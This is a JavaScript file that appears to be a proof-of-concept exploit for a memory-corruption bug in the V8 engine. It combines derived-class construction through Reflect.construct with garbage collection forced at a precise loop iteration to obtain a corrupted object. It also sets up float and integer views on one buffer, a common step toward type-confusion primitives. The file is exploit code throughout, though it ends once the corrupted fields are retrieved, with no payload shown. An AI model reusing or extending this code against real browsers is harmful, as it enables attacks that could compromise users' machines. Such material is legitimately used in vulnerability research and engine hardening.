let empty_object = {};
let empty_array = [];
let corrupted_instance = null;
let dogc_flag = false;
let buffer = new ArrayBuffer(8);
let f64 = new Float64Array(buffer);
let u32 = new Uint32Array(buffer);

function dogc() {
        if(dogc_flag == true) {
                for(let i = 0 ; i < 1000; i++){
                        new ArrayBuffer(0x10000);
                        }
                }
        }

class ClassParent {}
class ClassBug extends ClassParent {
        constructor(a20, a21, a22) {
                const v24 = new new.target();
                let x = [empty_object, empty_object, empty_object, empty_object, 
                empty_object, empty_object, empty_object, empty_object];
                super();
                let a = [1.1];
                this.x = x;
                this.a = a;
                JSON.stringify(empty_array);
        }
        [1] = dogc();
}

for (let i = 0; i<200; i++) {
        dogc_flag = false;
        if (i%2 == 0) dogc_flag = true;
        dogc();
}

for (let i = 0; i < 650; i++) {
        dogc_flag=false;
        if (i > 641) {
                dogc_flag=true;
                dogc();
                dogc_flag=false;
        }
        if (i == 646) dogc_flag=true;
        let x = Reflect.construct(ClassBug, empty_array, ClassParent);
        if (i == 646) {
                corrupted_instance = x;
//                %DebugPrint(corrupted_instance);
                %DebugPrint(corrupted_instance.x);
//                %DebugPrint(corrupted_instance.a);
        }
}

let x = corrupted_instance.x;
let a = corrupted_instance.a;
